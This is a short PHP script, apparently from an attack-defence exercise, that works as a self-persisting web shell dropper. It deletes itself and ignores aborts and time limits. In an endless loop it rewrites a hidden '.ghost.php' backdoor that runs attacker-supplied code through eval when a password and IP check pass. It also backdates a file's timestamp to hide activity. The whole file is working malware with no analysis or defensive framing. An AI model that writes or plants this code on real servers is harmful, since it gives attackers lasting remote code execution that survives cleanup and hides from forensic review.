<?php ;
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = './.ghost.php';
$code = '<?php if($_REQUEST["pass"]=="'.$_POST['init'].'" and $_SERVER["REMOTE_ADDR"] == "'.$_SERVER["REMOTE_ADDR"].'"){@eval($_POST["kali"]);} ?>';
while (1){
    file_put_contents($file,$code);
    system('touch -m -d "2017-11-17 10:10:10" .i_will_be_back.php');
    sleep(50);
}
?>